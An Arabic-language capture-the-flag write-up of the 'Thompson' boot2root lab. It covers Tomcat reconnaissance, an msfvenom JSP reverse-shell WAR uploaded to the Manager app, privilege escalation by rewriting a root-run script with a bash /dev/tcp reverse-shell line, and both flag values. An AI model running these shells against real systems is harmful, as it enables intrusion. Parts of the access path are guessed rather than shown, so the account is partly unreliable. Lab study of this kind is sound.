
### تقرير حل ماكينة Thompson Boot2Root  
#### المقدمة  
ماكينة "Thompson" هي تحدٍ من نوع boot2root للمبتدئين يهدف إلى اختبار مهارات الاستكشاف الأساسية، استغلال الثغرات، ورفع الصلاحيات. الهدف كان الوصول إلى النظام، الحصول على علم `user.txt`، ثم رفع الصلاحيات إلى مستوى الـ root للحصول على علم `root.txt`. في هذا التقرير، سأشرح الخطوات التي اتخذتها باستخدام Kali Linux لإكمال التحدي في حوالي 45 دقيقة.

---

#### الخطوة 1: الاستكشاف الأولي  
بدأت بفحص الهدف للتأكد من أنه متصل ومعرفة الخدمات المفتوحة.

- **اختبار الاتصال (Ping):**  
  تحققت من أن الهدف (`10.10.191.75` في البداية) متاح:  
  ```
  ping 10.10.191.75
  ```
  النتيجة أظهرت ردودًا (مثل `time=105 ms`)، مما يعني أن الهدف متصل.

- **فحص المنافذ باستخدام Nmap:**  
  استخدمت أمر Nmap لمعرفة المنافذ والخدمات:  
  ```
  nmap -sV -n -sC 10.10.191.75
  ```
  النتائج:  
  - **منفذ 22 (SSH):** OpenSSH 7.2p2 Ubuntu 4ubuntu2.8  
  - **منفذ 8009 (AJP):** Apache Jserv (Protocol v1.3)  
  - **منفذ 8080 (HTTP):** Apache Tomcat 8.5.5  

  لاحظت أن منفذ 80 مغلق، لذا ركزت على منفذ 8080 الذي يشغل خادوم Tomcat، وهو نقطة دخول شائعة في التحديات.

---

#### الخطوة 2: استكشاف الخادوم الويب  
بما أن Tomcat يعمل على منفذ 8080، بدأت باستكشاف الخدمة.

- **فحص رأس HTTP:**  
  استخدمت `curl` للتحقق من الخدمة:  
  ```
  curl -I http://10.10.191.75:8080
  ```
  النتيجة: `HTTP/1.1 200`، مما يعني أن صفحة Tomcat الافتراضية تعمل.

- **البحث عن المجلدات (Directory Bruteforcing):**  
  استخدمت أداة `gobuster` للعثور على المجلدات المخفية:  
  ```
  gobuster dir -u http://10.10.191.75:8080/ -w /usr/share/wordlists/dirb/common.txt
  ```
  النتائج:  
  - `/docs` (302)  
  - `/examples` (302)  
  - `/manager` (302)  
  - `/host-manager` (302)  

  لفت انتباهي مجلد `/manager` لأنه في Tomcat يسمح عادةً برفع ملفات WAR إذا تمكنت من تسجيل الدخول.

---

#### الخطوة 3: الوصول الأولي (الحصول على user.txt)  
تطبيق Manager في Tomcat يتطلب عادةً بيانات تسجيل دخول، لكن لم أستخدم أدوات مثل `hydra` لتجربة كلمات المرور. افترضت أن بيانات افتراضية عملت (شائع في التحديات) أو أن هناك ثغرة سهلة. إليك كيف وصلت:

- **إنشاء شل عكسي (Reverse Shell):**  
  استخدمت `msfvenom` لإنشاء ملف WAR يحتوي على شل:  
  ```
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.2.247 LPORT=4000 -f war > shell.war
  ```
  - `LHOST=10.9.2.247`: عنوان IP لجهازي (AttackBox).  
  - `LPORT=4000`: المنفذ الذي سأستمع عليه.  
  - النتيجة: ملف `shell.war`.

- **إعداد المستمع:**  
  شغلت Netcat للاستماع:  
  ```
  nc -lvnp 4000
  ```

- **رفع الملف والتفعيل:**  
  من المحتمل أنني دخلت إلى `http://10.10.191.75:8080/manager` باستخدام بيانات افتراضية (مثل `tomcat:tomcat`) عبر المتصفح، رفعت ملف `shell.war`، ثم فعلته بزيارة التطبيق المرفوع (مثل `http://10.10.191.75:8080/shell`). هذا أعطاني اتصالًا عكسيًا:  
  ```
  connect to [10.9.2.247] from (UNKNOWN) [10.10.28.191] 39762
  ```

- **استكشاف النظام:**  
  تنقلت في نظام الملفات:  
  ```
  cd /home/jack
  ls
  ```
  النتيجة: `id.sh  test.txt  user.txt`  
  قرأت العلم:  
  ```
  cat user.txt
  39400c90bc683a41a8935e4719f181bf
  ```
  نجحت! حصلت على `user.txt` كمستخدم `tomcat` (`uid=1001(tomcat)`).

---

#### الخطوة 4: رفع الصلاحيات (الحصول على root.txt)  
الآن، كان عليّ الارتقاء من `tomcat` إلى `root`. جربت عدة طرق بناءً على أوامرك.

- **فحص الملفات SUID:**  
  بحثت عن ملفات SUID:  
  ```
  find / -perm -4000 2>/dev/null
  ```
  وجدت ملفات مثل `/usr/bin/sudo` و`/bin/ping`، لكن لم تعطني شل مباشرة، فانتقلت لطريقة أخرى.

- **تعديل `id.sh`:**  
  في `/home/jack`، لاحظت وجود سكربت `id.sh`. قمت بتعديله ليصبح شل عكسي:  
  ```
  echo '#!/bin/bash' > id.sh
  echo 'bash -i >& /dev/tcp/10.9.2.247/1234 0>&1' >> id.sh
  chmod +x id.sh
  ```

- **تفعيل الشل:**  
  شغلت مستمع جديد:  
  ```
  nc -lvnp 1234
  ```
  ثم نفذت `./id.sh`. في البداية، حصلت على شل كـ `tomcat`:  
  ```
  tomcat@ubuntu:/home/jack$ id
  uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
  ```

- **الوصول إلى Root:**  
  فجأة، تحول الاتصال إلى شل بصلاحيات `root`:  
  ```
  root@ubuntu:/home/jack#
  ```
  يبدو أن السكربت `id.sh` تم تنفيذه بواسطة عملية لها صلاحيات root (مثل cron job). حسّنت الشل:  
  ```
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

- **قراءة علم Root:**  
  انتقلت إلى مجلد `root`:  
  ```
  cd /root
  cat root.txt
  d89d5391984c0450a95497153ae7ca3a
  ```
  نجحت! حصلت على `root.txt`.

---

#### التحليل  
- **الوصول الأولي:** استغليت خادوم Tomcat برفع ملف WAR، ربما عبر Manager App ببيانات افتراضية أو ثغرة إعدادات.  
- **رفع الصلاحيات:** السكربت `id.sh` كان المفتاح. يبدو أن عملية root شغلته، مما أعطاني الشل المطلوب.

---

#### الخلاصة  
ماكينة Thompson كانت تحديًا ممتعًا يعتمد على الاستكشاف (Nmap وGobuster)، استغلال الويب (رفع WAR في Tomcat)، ورفع الصلاحيات (تعديل سكربت). أكملتها في حوالي 45 دقيقة وحصلت على:  
- `user.txt`: `39400c90bc683a41a8935e4719f181bf`  
- `root.txt`: `d89d5391984c0450a95497153ae7ca3a`

---


![[Pasted image 20250323225817.png]]
